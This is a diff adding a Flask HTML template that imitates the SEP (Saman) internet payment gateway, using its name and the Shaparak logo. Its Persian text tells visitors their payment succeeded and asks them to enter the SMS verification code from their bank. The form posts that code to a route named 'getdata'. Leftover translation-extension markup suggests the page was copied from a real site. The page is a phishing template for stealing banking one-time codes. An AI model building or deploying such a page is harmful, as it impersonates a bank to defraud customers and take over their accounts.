@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='css/styles.css') }}"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <header
+      class="header"
+      role="heading"
+      aria-label="درگاه پرداخت اینترنتی سِپ"
+    >
+      <div class="container">
+        <div class="nav">
+          <h1 class="font-bold">درگاه پرداخت اینترنتی سِپ</h1>
+        </div>
+        <div class="card">
+          <image
+            src="{{url_for('static',filename='images/sapwhite.png')}}"
+            class=""
+          ></image>
+          <div class="center-div">
+            <h1 class="hide-sm">درگاه پرداخت اینترنتی سِپ</h1>
+          </div>
+          <image
+            src="{{url_for('static',filename='images/shaparak.png')}}"
+            class=""
+          ></image>
+        </div>
+      </div>
+    </header>
+    <div class="main" data-culture="fa" data-version="">
+      <div class="container">
+        <main>
+          <div class="container my-10">
+            <h1>پرداخت شما موفقیت آمیز بود</h1>
+        
+
+              <form  method="POST" action="{{ url_for("getdata")}}">
+              <div class="head hide-sm">
+                <h2>    جهت تکمیل خرید کد پیامک شده از طرف بانک خود را وارد کرده و روی
+              گزینه ی تکمیل خرید کلیک کنید  <sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                        class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                          fill="currentColor"></path>
+                      </svg></sider-trans-inline></sider-trans></h2>
+              </div>
+              <input id="1" name="Culture" type="hidden" value="fa" class="ignore">
+              <input id="SessionKey" name="SessionKey" type="hidden" value="ZYGY24xa3Qg" class="ignore">
+              <div class="row">
+                <div class="col col-12">
+                 
+              <div class="row">
+                <div class="col col-12">
+                  <label for="Pin2">کد تایید<sider-trans data-url-id="-646198308"><sider-trans-inline><svg
+                          class="sider-trans-icon sider-trans-loading" style="display: inline;" width="12" height="12"
+                          xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="none">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M10.034 1.621a.6.6 0 01-.716.455A6.07 6.07 0 003.53 12.103a.6.6 0 11-.884.812A7.27 7.27 0 019.58.905a.6.6 0 01.455.716zm2.473 1.428a.6.6 0 01.848.036 7.27 7.27 0 01-6.934 12.01.6.6 0 11.26-1.171 6.07 6.07 0 005.79-10.027.6.6 0 01.036-.848z"
+                            fill="currentColor"></path>
+                        </svg></sider-trans-inline></sider-trans></label>
+                  <div class="input-group">
+                    <div class="input-holder has-action action-left">
+                      <input name="code"  aria-label=" کد تایید" autocomplete="off" class="password en-plh"
+                        data-back="CaptchaInputText" data-focus="Purchase" data-label=" کد تایید" data-name="Pin2"
+                        data-val="true" data-val-length="تعداد کارکترهای فیلد رمز دوم باید بین 4 و 12 باشد"
+                        data-val-length-max="12" data-val-length-min="4"
+                        data-val-regex="فیلد رمز دوم فقط مقادیر عددی می‌پذیرد" data-val-regex-pattern="^\d+$"
+                        data-val-required="رمز دوم الزامی است" id="Pin2" inputmode="numeric" maxlength="12"
+                        minlength="5" name="Pin2" placeholder=" کد تایید" tabindex="0" type="tel" value="">
+                      <button id="Pin2VirtualKeypad" name="Pin2VirtualKeypad" type="button" class="action"
+                        data-relation="VirtualKeypad" role="button" tabindex="0" aria-label="صفحه کلید امن"
+                        aria-pressed="false">
+                        <image src="{{url_for('static',filename='images/keyboard.png')}}" class=""></image>
+                      </button>
+                    </div>
+                    
+                  </div>
+                  <span class="field-validation-valid input-wrong" data-valmsg-for="Pin2"
+                    data-valmsg-replace="true"></span>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col col-12">
+                  
+                </div>
+              </div>
+              <div class="row mless-3x">
+                <div class="col col-12">
+                  <button id="Purchase" name="Purchase" type="submit" class="button success full-width"
+                    data-focus="Cancel" data-back="Pin2" data-action="Purchase" role="button" tabindex="0">تکمیل خرید
+                    </button>
+                </div>
+              </div>
+              
+              
+
+
+             
+              </form>
+          </div>
+        </main>
+      </div>
+    </div>
+
+  </body>
+</html>
